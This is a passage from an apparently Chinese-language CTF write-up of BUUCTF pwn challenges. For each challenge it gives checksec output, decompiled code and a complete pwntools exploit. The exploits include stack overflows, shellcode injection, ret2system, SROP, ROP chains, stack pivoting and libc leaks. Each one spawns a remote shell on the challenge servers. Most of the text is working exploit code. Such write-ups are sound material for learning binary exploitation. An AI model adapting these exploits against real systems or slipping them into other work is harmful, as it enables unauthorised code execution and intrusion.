    p.sendline(str(type))
    if type == 1:
        p.recvuntil(&quot;Value &gt; &quot;)
        p.sendline(str(value))
    else:
            p.recvuntil(&quot;Length &gt; &quot;)
            p.sendline(str(length))
            p.recvuntil(&quot;Value &gt; &quot;)
            if length == 8:
                p.send(value)
            else:
                p.sendline(value)
def delnote(idx):
    p.recvuntil(&quot;CNote &gt; &quot;)
    p.sendline(str(2))
    p.recvuntil(&quot;Index &gt; &quot;)
    p.sendline(str(idx))
def shownote(idx):
    p.recvuntil(&quot;CNote &gt; &quot;)
    p.sendline(str(3))
    p.recvuntil(&quot;Index &gt; &quot;)
    p.sendline(str(idx))
if __name__ == &quot;__main__&quot;:
    newnote(0,2,'a'*10,0x88)
    newnote(1,2,'a'*10,0x38)
    gdb.attach(p)
    newnote(2,1,0x41)
    #newnote(2,2,'b'*10,0x38)
    delnote(1)
    delnote(2)
    newnote(3,2,'aaaa'+p32(elf.plt['system']),0xc)
    #gdb.attach(p)
    newnote(4,2,&quot;/bin/sh\x00&quot;,0x38)
    delnote(1)

    p.interactive()
</code></pre>
<h2>ciscn_2019_n_5</h2>
<h3>1.checksec</h3>
<pre><code>    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
</code></pre>
<h3>2.IDA</h3>
<p><strong>main</strong></p>
<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4; // [rsp+0h] [rbp-20h]

  setvbuf(stdout, 0LL, 2, 0LL);
  puts(&quot;tell me your name&quot;);
  read(0, &amp;name, 0x64uLL);
  puts(&quot;wow~ nice name!&quot;);
  puts(&quot;What do you want to say to me?&quot;);
  gets(&amp;v4, &amp;name);
  return 0;
}
</code></pre>
<p><strong>name</strong></p>
<pre><code>.bss:0000000000601080                 public name
.bss:0000000000601080 name            db    ? ;               ; DATA XREF: main+35↑o
.bss:0000000000601081                 db    ? ;
.bss:0000000000601082                 db    ? ;
.bss:0000000000601083                 db    ? ;
.bss:0000000000601084                 db    ? ;
.bss:0000000000601085                 db    ? ;
.bss:0000000000601086                 db    ? ;
.bss:0000000000601087                 db    ? ;
</code></pre>
<blockquote>
<p>既然没有保护，应该是shellcode，所以不要往复杂的方向想</p>
<p>shellcode + 溢出 + 栈转移</p>
</blockquote>
<h3>3.EXP</h3>
<pre><code class="language-python">from pwn import *
context.log_level = &quot;debug&quot;
p = remote(&quot;node3.buuoj.cn&quot;,26651)
elf = ELF(&quot;./ciscn_2019_n_5&quot;)
context(arch='amd64',os='linux')

name_addr = 0x0601080

shellcode  = asm(shellcraft.sh())
p.recvuntil('tell me your name\n')
p.sendline(shellcode)
payload = 'a'*(0x20+8)+p64(name_addr)
p.recvuntil('me?')
p.sendline(payload)
p.interactive()
</code></pre>
<p><strong>context的类型一定要写</strong></p>
<h2>ciscn_2019_n_8</h2>
<h3>1.checksec()</h3>
<pre><code>[*] '/root/download/BUUCTF/ciscn_2019_n_8/ciscn_2019_n_8'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
</code></pre>
<p>全保护，我尿了</p>
<h3>2.IDA</h3>
<p>main</p>
<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [esp-14h] [ebp-20h]
  int v5; // [esp-10h] [ebp-1Ch]

  var[13] = 0;
  var[14] = 0;
  init();
  puts(&quot;What's your name?&quot;);
  __isoc99_scanf(&quot;%s&quot;, var, v4, v5);            // ====+STACK_OVERFLOW+====
  if ( *(_QWORD *)&amp;var[13] )
  {
    if ( *(_QWORD *)&amp;var[13] == 17LL )
      system(&quot;/bin/sh&quot;);
    else
      printf(
        &quot;something wrong! val is %d&quot;,
        var[0],
        var[1],
        var[2],
        var[3],
        var[4],
        var[5],
        var[6],
        var[7],
        var[8],
        var[9],
        var[10],
        var[11],
        var[12],
        var[13],
        var[14]);
  }
  else
  {
    printf(&quot;%s, Welcome!\n&quot;, var);
    puts(&quot;Try do something~&quot;);
  }
  return 0;
}
</code></pre>
<blockquote>
<p>第一个输入让var[13]为17可以进入,不管用啥方式，覆盖52个位置就可以传递17这个数字了，超级简单</p>
</blockquote>
<h3>3.EXP</h3>
<pre><code class="language-python">from pwn import *
#context.log_level = &quot;debug&quot;
p = remote(&quot;node3.buuoj.cn&quot;,26629)
#p = process(&quot;./ciscn_2019_n_8&quot;)
payload = &quot;a&quot;*52 + p32(17)
p.sendlineafter(&quot;?&quot;,payload)
p.interactive()
</code></pre>
<h2>ciscn_2019_ne_5</h2>
<h3>1.checksec</h3>
<pre><code>    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
</code></pre>
<h3>2.IDA</h3>
<p><strong>main</strong></p>
<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v3; // [esp+0h] [ebp-100h]
  char src[4]; // [esp+4h] [ebp-FCh]
  char v5; // [esp+8h] [ebp-F8h]
  char s1[4]; // [esp+84h] [ebp-7Ch]
  char v7; // [esp+88h] [ebp-78h]
  int *v8; // [esp+F4h] [ebp-Ch]

  v8 = &amp;argc;
  setbuf(stdin, 0);
  setbuf(stdout, 0);
  setbuf(stderr, 0);
  fflush(stdout);
  *(_DWORD *)s1 = 48;
  memset(&amp;v7, 0, 0x60u);
  *(_DWORD *)src = 0x30;
  memset(&amp;v5, 0, 0x7Cu);
  puts(&quot;Welcome to use LFS.&quot;);
  printf(&quot;Please input admin password:&quot;);
  __isoc99_scanf((int)&quot;%100s&quot;, (int)s1);
  if ( strcmp(s1, &quot;administrator&quot;) )
  {
    puts(&quot;Password Error!&quot;);
    exit(0);
  }
  puts(&quot;Welcome!&quot;);
  while ( 1 )
  {
    puts(&quot;Input your operation:&quot;);
    puts(&quot;1.Add a log.&quot;);
    puts(&quot;2.Display all logs.&quot;);
    puts(&quot;3.Print all logs.&quot;);
    printf(&quot;0.Exit\n:&quot;);
    __isoc99_scanf((int)&quot;%d&quot;, (int)&amp;v3);
    switch ( v3 )
    {
      case 0:
        exit(0);
        return;
      case 1:
        AddLog((int)src);
        break;
      case 2:
        Display(src);
        break;
      case 3:
        Print();
        break;
      case 4:
        GetFlag(src);
        break;
      default:
        continue;
    }
  }
}
</code></pre>
<p><strong>GetFlag</strong></p>
<pre><code class="language-c">int __cdecl GetFlag(char *src)
{
  char dest[4]; // [esp+0h] [ebp-48h]
  char v3; // [esp+4h] [ebp-44h]

  *(_DWORD *)dest = 0x30;
  memset(&amp;v3, 0, 0x3Cu);
  strcpy(dest, src);
  return printf(&quot;The flag is your log:%s\n&quot;, dest);
}
</code></pre>
<blockquote>
<p>取程序里面fflush的sh填入system参数+栈溢出</p>
</blockquote>
<h3>3.EXP</h3>
<pre><code class="language-python">from pwn import *
#context.log_level = 'debug'
p = remote(&quot;node3.buuoj.cn&quot;,26685)
#p = process(&quot;./ciscn_2019_ne_5&quot;)
elf = ELF(&quot;./ciscn_2019_ne_5&quot;)

sys_addr = elf.plt['system']
sh_addr = 0x080482E0+0xA

payload = 'a'*(0x48+4)+p32(sys_addr)+'aaaa'+p32(sh_addr)

p.recvuntil('Please input admin password:')
p.sendline('administrator')

p.recvuntil('0.Exit\n:')
p.sendline('1')

p.recvuntil('Please input new log info:')
p.sendline(payload)

p.recvuntil('0.Exit\n:')
p.sendline('4')

p.interactive()
</code></pre>
<h2>ciscn_2019_s_3</h2>
<h3>1.checksec()</h3>
<pre><code>root@joe1sn:~/download/BUUCTF/ciscn_2019_s_3# checksec ciscn_s_3
[*] '/root/download/BUUCTF/ciscn_2019_s_3/ciscn_s_3'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</code></pre>
<h3>2.IDA</h3>
<p>main</p>
<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
{
  return vuln();
}
</code></pre>
<p>vuln</p>
<pre><code class="language-c">signed __int64 vuln()
{
  signed __int64 result; // rax

  __asm { syscall; LINUX - sys_read }
  result = 1LL;
  __asm { syscall; LINUX - sys_write }
  return result;
}
</code></pre>
<blockquote>
<p>居然是汇编，这种题从来没遇见过</p>
<p>不过看得出来(结合汇编)</p>
<p>sys_write：向栈上写数据(0x400)</p>
<p>sys_read：从栈上读数据(0x30)</p>
</blockquote>
<p>查了查WP</p>
<p><a href="https://blog.csdn.net/github_36788573/article/details/103541178">https://blog.csdn.net/github_36788573/article/details/103541178</a></p>
<ul>
<li>3WriteUp分析</li>
<li>主要是gadget函数有东西</li>
</ul>
<pre><code class="language-assembly">; __unwind {
push    rbp
mov     rbp, rsp
mov     rax, Fh
retn
mov     rax, 59
retn
pop     rbp
retn
} // starts at 4004D6
</code></pre>
<p>先是向rax传递了0xf，在linux的系统调用表示</p>
<blockquote>
<p>sys_rt_sigreturn(unsigned long _unused)</p>
</blockquote>
<p>15号系统调用sigreturn。这个系统调用是在终止信号恢复用户态环境时用的。那么我们在栈上伪造寄存器的值，那么恢复时就可将寄存器控制为我们想要的值。</p>
<p>向rax传递了59，在linux的系统调用表示</p>
<blockquote>
<p>sys_exec(const char *filename,const char *const argv[],const char *,const envp[])</p>
</blockquote>
<p>就相当于system函数</p>
<p>59号系统调用是execve那么就可以想办法控制寄存器的值调用execve(&quot;/bin/sh&quot;,0,0)，注意在调用execve时，后面两个参数需要置0，由于需要控制rdx的值，所以选择使用通用gadget，__libc_csu_init。</p>
<p><strong>这就引申出两种解题方法</strong></p>
<h4>4.1 59号系统调用</h4>
<p>ropgadget</p>
<pre><code>Gadgets information
============================================================
0x00000000004004a3 : mov byte ptr [rip + 0x200b86], 1 ; ret
0x00000000004004e3 : mov eax, 0x3b ; ret
0x00000000004004db : mov eax, 0xf ; ret
0x00000000004004d8 : mov ebp, esp ; mov rax, 0xf ; ret
0x00000000004004e2 : mov rax, 0x3b ; ret
0x00000000004004da : mov rax, 0xf ; ret
0x000000000040059c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040059e : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004005a0 : pop r14 ; pop r15 ; ret
0x00000000004005a2 : pop r15 ; ret
0x00000000004004a2 : pop rbp ; mov byte ptr [rip + 0x200b86], 1 ; ret
0x000000000040059b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040059f : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000400440 : pop rbp ; ret
0x00000000004005a3 : pop rdi ; ret
0x00000000004005a1 : pop rsi ; pop r15 ; ret
0x000000000040059d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004003a9 : ret

Unique gadgets found: 18
</code></pre>
<h5>3.EXP</h5>
<pre><code class="language-python">from pwn import *
context.log_level = &quot;debug&quot;
p = remote(&quot;node3.buuoj.cn&quot;,26249)

vuln_addr = 0x04004ED
execv = 0x04004E2
pop_rdi = 0x04005A3
pop_5_ret = 0x040059A
mov_RDX_r13  =0x0400580
sys_write = 0x0400517

payload = &quot;/bin/sh\x00&quot;*2 + p64(vuln_addr)
p.send(payload)
p.recv(0x20)
  = u64(p.recv(8)) - 280
print(hex( ))

payload = &quot;/bin/sh\x00&quot;*2 + p64(pop_5_ret) + p64(0)*2
payload += p64( +0x50)+p64(0)*3
payload += p64(mov_RDX_r13) + p64(execv)
payload += p64(pop_rdi) + p64( ) + p64(sys_write)
p.send(payload)
p.interactive()
</code></pre>
<p>这个EXP是可以打通的，看上去和普通write泄露libc的EXP差不多</p>
<p>其实包含了很多汇编的底层知识</p>
<h4>4.2FramingSignals-AReturntoPortableShellcode</h4>
<h5><strong>SROP</strong></h5>
<p><a href="http://www.ieee-security.org/TC/SP2014/papers/FramingSignals-AReturntoPortableShellcode.pdf">FramingSignals-AReturntoPortableShellcode</a></p>
<pre><code class="language-python">from pwn import *

io=process('./ciscn_s_3')

main=0x0004004ED
sigret=0x4004DA
sys=0x400517

pl1='/bin/sh\x00'*2+p64(main)
io.send(pl1)
io.recv(0x20)
sh=u64(io.recv(8))-280
print(hex(sh))
frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = sh
frame.rsi = 0
frame.rdx = 0
frame.rip = sys
pl1='a'*16+p64(sigret)+p64(sys)+str(frame)
'''
def debug(addr):
    raw_input('debug:')
    gdb.attach(io, &quot;b *&quot; + addr)
debug('0x400514')
'''
pl2='/bin/sh\x00'*2+p64(sigret)+p64(sys)+str(frame)
io.send(pl2)
io.interactive()  
</code></pre>
<p><strong>参考南梦的打法</strong>
[CTF-BUUCTF-Pwn刷题之旅-](<a href="https://196011564.github.io/2019/07/13/CTF-BUUCTF-Pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85-(1)/">https://196011564.github.io/2019/07/13/CTF-BUUCTF-Pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85-(1)/</a></p>
<h2>ciscn_2019_s_4</h2>
<h3>1.checksec</h3>
<pre><code>    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
</code></pre>
<h3>2.IDA</h3>
<p><strong>vuln</strong></p>
<pre><code class="language-c">int vul()
{
  char s; // [esp+0h] [ebp-28h]

  memset(&amp;s, 0, 0x20u);
  read(0, &amp;s, 0x30u);
  printf(&quot;Hello, %s\n&quot;, &amp;s);
  read(0, &amp;s, 0x30u);
  return printf(&quot;Hello, %s\n&quot;, &amp;s);
}
</code></pre>
<blockquote>
<p>两次很短的栈溢出，第一次<code>ebp leak</code>，第二次<code>leave ret</code></p>
</blockquote>
<h3>3.GDB</h3>
<ul>
<li>**1.**输入0x20+4个字符串，泄露ebp</li>
</ul>
<pre><code>ECX: 0xffffcff0 ('a' &lt;repeats 36 times&gt;, &quot;\n\320\377\377(\320\377\377*\206\004\b\334c\373\367@\320\377\377&quot;)
................
EBP: 0xffffd018 --&gt; 0xffffd028 --&gt; 0x0 
</code></pre>
<pre><code class="language-python">&gt;&gt;&gt; hex(0xffffcff0- 0xffffd018)
'-0x28'
</code></pre>
<blockquote>
<p>下一步时，程序会抬栈，所以这时候的buf为<code>0xffffd028</code>，偏移量为<code>0x28-0x10</code></p>
</blockquote>
<ul>
<li><strong>2.构造payload</strong></li>
</ul>
<p>主要目标是：让程序<code>ret</code>到栈开始的地方，将刚才构造的<code>payload</code>当作命令执行</p>
<pre><code class="language-python">pl2=('aaaa'+p32(sys_plt)+'bbbb'+p32(buf+0x10)+'/bin/sh\x00').ljust(0x28,'a')+p32(buf)+p32(leave)
</code></pre>
<h3>4.EXP</h3>
<pre><code class="language-python">from pwn import *
context.log_level = &quot;debug&quot;
#p = remote(&quot;node3.buuoj.cn&quot;,&quot;26826&quot;)
p = process(&quot;./ciscn_s_4&quot;)
elf = ELF(&quot;./ciscn_s_4&quot;)

leave=0x8048562
sys_plt=0x8048400

pl1='a'*0x24+'bbbb'
p.send(pl1)
p.recvuntil('bbbb')
ebp=u32(p.recv(4))
success(&quot;EBP =&gt;0x%x&quot;,ebp)
context.terminal=[&quot;tmux&quot;,'splitw','-h']
gdb.attach(p)

buf=ebp-0x38
pl2=('aaaa'+p32(sys_plt)+'bbbb'+p32(buf+16)+'/bin/sh\x00').ljust(0x28,'a')+p32(buf)+p32(leave)
p.send(pl2)

p.interactive()
</code></pre>
<h2>cisncn_2019_s_6</h2>
<p>和<a href="http://www.joe1sn.top/2020/BUUCTF/#ciscn_2019_es_1">ciscn_2019_es_1</a>一样</p>
<h2>ciscn_2019_s_9</h2>
<h3>1.checksec</h3>
<pre><code>    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
</code></pre>
<blockquote>
<p>估计和shellcode相关</p>
</blockquote>
<h3>2.IDA</h3>
<p><strong>pwn</strong></p>
<pre><code class="language-c">int pwn()
{
  char s[24]; // [esp+8h] [ebp-20h]

  puts(&quot;\nHey! ^_^&quot;);
  puts(&quot;\nIt's nice to meet you&quot;);
  puts(&quot;\nDo you have anything to tell?&quot;);
  puts(&quot;&gt;&quot;);
  fflush(stdout);
  fgets(s, 50, stdin);
  puts(&quot;OK bye~&quot;);
  fflush(stdout);
  return 1;
}
</code></pre>
<blockquote>
<p>第十行栈溢出</p>
</blockquote>
<p><strong>hint</strong></p>
<pre><code class="language-assembly">; Attributes: bp-based frame
;void hint
public hint
hint proc near
; __unwind {
push    ebp
mov     ebp, esp
jmp     esp
hint endp
</code></pre>
<blockquote>
<p>利用<code>jmp esp</code>实现跳转</p>
</blockquote>
<h3>3.EXP</h3>
<pre><code class="language-python">from pwn import *
context.log_level = &quot;debug&quot;
elf = ELF(&quot;./ciscn_s_9&quot;)
p = remote(&quot;node3.buuoj.cn&quot;,&quot;25940&quot;)

shellcode =  &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&quot;
gadget = asm(&quot;sub esp,0x28 ; jmp esp&quot;)
jmp_esp = 0x08048554

payload = shellcode.ljust(0x24,'\x00')+p32(jmp_esp)+gadget
p.sendline(payload)
p.interactive()
</code></pre>
<h2>cmcc_pwnme1</h2>
<h3>1.checksec</h3>
<pre><code>    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
</code></pre>
<h3>2.IDA</h3>
<p><strong>getfruit</strong></p>
<pre><code class="language-c">int getfruit()
{
  char v1; // [esp+14h] [ebp-A4h]

  fflush(stdout);
  printf(&quot;Please input the name of fruit:&quot;);
  __isoc99_scanf(&quot;%s&quot;, &amp;v1);
  return printf(&quot;oh,%s...\n&quot;, &amp;v1);
}
</code></pre>
<blockquote>
<p>栈溢出</p>
</blockquote>
<h3>3.EXP</h3>
<pre><code class="language-python">from pwn import *
from LibcSearcher import *
context.log_level = &quot;debug&quot;
elf = ELF(&quot;./pwnme1&quot;)
p = remote(&quot;node3.buuoj.cn&quot;,&quot;28427&quot;)

puts_plt = elf.plt[&quot;puts&quot;]
puts_got = elf.got[&quot;puts&quot;]
getfruit = 0x08048624

payload = 'a'*(0xA4+4)
payload += p32(puts_plt)+p32(getfruit)+p32(puts_got)

p.sendlineafter(&quot;&gt;&gt; 6. Exit    &quot;,'5')
p.sendlineafter(&quot;Please input the name of fruit:&quot;,payload)


puts_real = u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
libc = LibcSearcher(&quot;puts&quot;,puts_real)
base = puts_real-libc.dump(&quot;puts&quot;)
sys_addr = base+libc.dump(&quot;system&quot;)
binsh = base+libc.dump(&quot;str_bin_sh&quot;)
success(&quot;libc base 0x%x&quot;,base)
success(&quot;binsh 0x%x&quot;,binsh)
success(&quot;system 0x%x&quot;,sys_addr)

payload = 'a'*(0xA4+4)
payload += p32(sys_addr)+'aaaa'+p32(binsh)
p.sendlineafter(&quot;Please input the name of fruit:&quot;,payload)
p.interactive()
</code></pre>
<h2>cmcc_pwnme2</h2>
<h3>1.checksec</h3>
<pre><code>    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
</code></pre>
<h3>2.IDA</h3>
<p><strong>userfunction</strong></p>
<pre><code class="language-c">int __cdecl userfunction(char *src)
{
  char dest; // [esp+Ch] [ebp-6Ch]
  strcpy(&amp;dest, src);
  return printf(&quot;Hello, %s\n&quot;, src);
}
</code></pre>
<blockquote>
<p>之前在<code>main</code>里面输入过多的话，会导致这里栈溢出</p>
</blockquote>
<p><strong>exec_string</strong></p>
<pre><code class="language-c">int exec_string()
{
  char s; // [esp+Bh] [ebp-Dh]
  FILE *stream; // [esp+Ch] [ebp-Ch]

  stream = fopen(&amp;string, &quot;r&quot;);
  if ( !stream )
    perror(&quot;Wrong file&quot;);
  fgets(&amp;s, 50, stream);
  puts(&amp;s);
  fflush(stdout);
  return fclose(stream);
}
</code></pre>
<blockquote>
<p><code>string</code>变量在bss段上，要想执行它，就必须把<code>/flag</code>命令写到<code>string</code>上，这里就可以构造payload</p>
</blockquote>
<h3>3.EXP</h3>
<pre><code class="language-python">from pwn import *
context.log_level = &quot;debug&quot;
sh = remote(&quot;node3.buuoj.cn&quot;,28490)
elf = ELF(&quot;pwnme2&quot;)
pop_ebp_ret = 0x08048680
offset = 0x6C+4
payload = offset * &quot;a&quot;
payload += p32(elf.plt['gets'])
payload += p32(pop_ebp_ret)
payload += p32(0x0804A060)#bss_string
payload += p32(0x080485CB)#exec_string
sh.sendlineafter(&quot;Please input:&quot;,payload)
sh.sendline(&quot;/flag&quot;)
sh.interactive()
</code></pre>
<h2>cmcc_simplerop</h2>
<h3>1.checksec</h3>
<pre><code>    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
</code></pre>
<h3>2.IDA</h3>
<blockquote>
<p>发现了超级多的无用函数</p>
</blockquote>
<p><strong>main</strong></p>
<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [esp+1Ch] [ebp-14h]

  puts(&quot;ROP is easy is'nt it ?&quot;);
  printf(&quot;Your input :&quot;);
  fflush(stdout);
  return read(0, &amp;v4, 100);
}
</code></pre>
<blockquote>
<p>很明显的<code>read</code>溢出，但是不大好的构造ropchain,所以先用ROPgadget自动生成ropchain，但是需要调整长度</p>
</blockquote>
<p><code>ROPgadget --binary simplerop --ropchain</code></p>
<h3>3.EXP</h3>
<pre><code class="language-python">from pwn import *
from struct import pack
#io=process('./simplerop')
io=remote(&quot;node3.buuoj.cn&quot;,25035)
io.recvuntil(':')
# Padding goes here
p = 'a'*0x14+p32(1)*3
p += pack('&lt;I', 0x0806e82a) # pop edx ; ret
p += pack('&lt;I', 0x080ea060) # @ .data
p += pack('&lt;I', 0x080bae06) # pop eax ; ret
p += '/bin'
p += pack('&lt;I', 0x0809a15d) # mov dword ptr [edx], eax ; ret
p += pack('&lt;I', 0x0806e82a) # pop edx ; ret
p += pack('&lt;I', 0x080ea064) # @ .data + 4
p += pack('&lt;I', 0x080bae06) # pop eax ; ret
p += '//sh'
p += pack('&lt;I', 0x0809a15d) # mov dword ptr [edx], eax ; ret
p += pack('&lt;I', 0x0806e850) # pop edx pop ecx pop edx; ret
p += pack('&lt;I', 0x0)
p += pack('&lt;I', 0x0)
p += pack('&lt;I', 0x080ea060) #bin/sh
p += pack('&lt;I', 0x080bae06) #pop eax
p += pack('&lt;I', 0xb)        # eax=0xb
p += pack('&lt;I', 0x080493e1) #int 80
io.send(p)
io.interactive()
print hex(len(p))
</code></pre>
<h2>ez_pz_hackover_2016</h2>
<h3>1.checksec</h3>
<pre><code class="language-bash">    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
</code></pre>
<h3>2.IDA</h3>
<p><strong>main</strong></p>
<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
{
  setbuf(stdout, 0);
  header();
  chall();
  return 0;
}
</code></pre>
<p><strong>chall</strong></p>
<pre><code class="language-c">int chall()
{
  size_t v0; // eax
  int result; // eax
  char s; // [esp+Ch] [ebp-40Ch]
  _BYTE *v3; // [esp+40Ch] [ebp-Ch]

  printf(&quot;Yippie, lets crash: %p\n&quot;, &amp;s);
  printf(&quot;Whats your name?\n&quot;);
  printf(&quot;&gt; &quot;);
  fgets(&amp;s, 1023, stdin);
  v0 = strlen(&amp;s);
  v3 = memchr(&amp;s, 10, v0);
  if ( v3 )
    *v3 = 0;
  printf(&quot;\nWelcome %s!\n&quot;, &amp;s);
  result = strcmp(&amp;s, &quot;crashme&quot;);
  if ( !result )
    result = vuln((unsigned int)&amp;s, 0x400u);
  return result;
}
</code></pre>
<p><strong>vuln</strong></p>
<pre><code class="language-c">void *__cdecl vuln(char src, size_t n)
{
  char dest; // [esp+6h] [ebp-32h]

  return memcpy(&amp;dest, &amp;src, n);
}
</code></pre>
<blockquote>
<p>strlen()遇见'\x00'截断</p>
</blockquote>
<blockquote>
<p>s 和 vuln里面dest 的ebp 的距离</p>
</blockquote>
<blockquote>
<p>memchr比较前十个字符串</p>
</blockquote>
<h3>3.EXP</h3>
<pre><code class="language-python">from pwn import *
#context.log_level = &quot;debug&quot;
p = remote(&quot;node3.buuoj.cn&quot;,29397)
#p = process(&quot;./ez_pz_hackover_2016&quot;)

p.recvuntil(&quot;Yippie, lets crash: 0x&quot;)
stack_addr = int(p.recv(8),16)
print hex(stack_addr)
payload = &quot;crashme\x00&quot; + 'a'*(0x40-0x32+4) 
payload += p32(stack_addr-(0x40-0x32+4+10)) + asm(shellcraft.sh())
p.sendlineafter(&quot;&gt; &quot;,payload)
p.interactive()
</code></pre>
<h2>get_started_3dsctf_2016</h2>
<h3>1.checksec()</h3>
<pre><code class="language-bash">    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
</code></pre>
<h3>2.IDA</h3>
<p><strong>main</strong></p>
<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4; // [esp+4h] [ebp-38h]

  printf(&quot;Qual a palavrinha magica? &quot;, v4);
  gets(&amp;v4);
  return 0;
}
</code></pre>
<p><strong>get_flag</strong></p>
<pre><code class="language-c">void __cdecl get_flag(int a1, int a2)
{
  int v2; // eax
  int v3; // esi
  unsigned __int8 v4; // al
  int v5; // ecx
  unsigned __int8 v6; // al

  if ( a1 == 814536271 &amp;&amp; a2 == 425138641 )
  {
    v2 = fopen(&quot;flag.txt&quot;, &quot;rt&quot;);
    v3 = v2;
    v4 = getc(v2);
    if ( v4 != 255 )
    {
      v5 = (char)v4;
      do
      {
        putchar(v5);
        v6 = getc(v3);
        v5 = (char)v6;
      }
      while ( v6 != 255 );
    }
    fclose(v3);
  }
}
</code></pre>
<blockquote>
<p>其实主要分析可知，这个程序的大致意思是修改eip改变程序流，最后执行cat_flag
但是BUU远程打不通，要使用mprotec函数修改内存的权限为可读可写可执行，再使用read函数写入shellcode到被解放的bss段</p>
</blockquote>
<ul>
<li><strong>mprotect</strong>原型</li>
</ul>
<pre><code class="language-c">#include &lt;sys/mman.h&gt;
int mprotect(void *addr, size_t len, int prot);
</code></pre>
<p>所以我们需要三个参数，就要ppp_ret</p>
<h3>3.EXP</h3>
<pre><code class="language-python">from pwn import *
#context.log_level = &quot;debug&quot;
p=remote('node3.buuoj.cn',28495)
elf=ELF('./get_started_3dsctf_2016')
pop3_ret = 0x0804951D
get_flag = 0x080489A0
got_addr = 0x080EB000
payload = 'a'*0x38+p32(elf.symbols['mprotect'])
payload += p32(pop3_ret)+p32(got_addr)+p32(0x1d8c)+p32(0x7)
payload += p32(elf.symbols['read'])
payload += p32(pop3_ret)+p32(0)+p32(got_addr)+p32(0x100)+p32(got_addr)
p.sendline(payload)
payload=asm(shellcraft.sh())
p.sendline(payload)
p.interactive()
</code></pre>
<h2>gyctf_2020_borrowstack</h2>
<h3>1.checksec</h3>
<pre><code>    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</code></pre>
<h3>2.IDA</h3>
<p><strong>main</strong></p>
<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf; // [rsp+0h] [rbp-60h]

  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  puts(&amp;s);
  read(0, &amp;buf, 0x70uLL);
  puts(&quot;Done!You can check and use your borrow stack now!&quot;);
  read(0, &amp;bank, 0x100uLL);
  return 0;
}
</code></pre>
<blockquote>
<p>第一步栈迁移，第二步抬高栈了过后<code>libc leak</code>，程序返回至第一个read，第三步<code>one gadget</code>来getshell</p>
</blockquote>
<h3>3.EXP</h3>
<pre><code class="language-python">from pwn import *
context.log_level = &quot;debug&quot;
io=remote('node3.buuoj.cn',25707)

bank=0x0601080
leave=0x400699
puts_plt=0x04004E0
puts_got=0x0601018
pop_rdi=0x400703
main=0x0400626
ret=0x4004c9

io.recvuntil('u want')
pl1='a'*0x60+p64(bank)+p64(leave)
io.send(pl1)
io.recvuntil('now!')
pl2=p64(ret)*20		#抬高栈
'''
ret指令用栈中的数据，修改IP的值，从而实现近转移。
CPU执行ret指令时，进行下面两步操作：
(IP)=((SS)*16+(SP))
(SP)=(SP)+2;
'''
pl2+=p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)
io.send(pl2)
io.recvline()
puts_add=u64(io.recv(6).ljust(8,'\x00'))
libc_base=puts_add-0x06f690
one_gadget=libc_base+0x4526a
pl3='a'*0x60+'bbbbbbbb'+p64(one_gadget)
io.send(pl3)

io.interactive()
</code></pre>
<h2>gyctf_2020_force</h2>
<h3>1.checksec</h3>
<pre><code>    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
</code></pre>
<h3>2.IDA</h3>
<p>有用的基本只有add</p>
<pre><code class="language-python">def add(sz,text):
	p.sendlineafter(&quot;2:puts\n&quot;,&quot;1&quot;)
	p.sendlineafter(&quot;size\n&quot;,str(sz))
	p.recvuntil(&quot;bin addr &quot;)
	addr = int(p.recvuntil('\n').strip(), 16)
	p.sendafter(&quot;content\n&quot;,text)
	return addr
</code></pre>
<p><strong>add</strong></p>
<pre><code class="language-c">  puts(&quot;size&quot;);
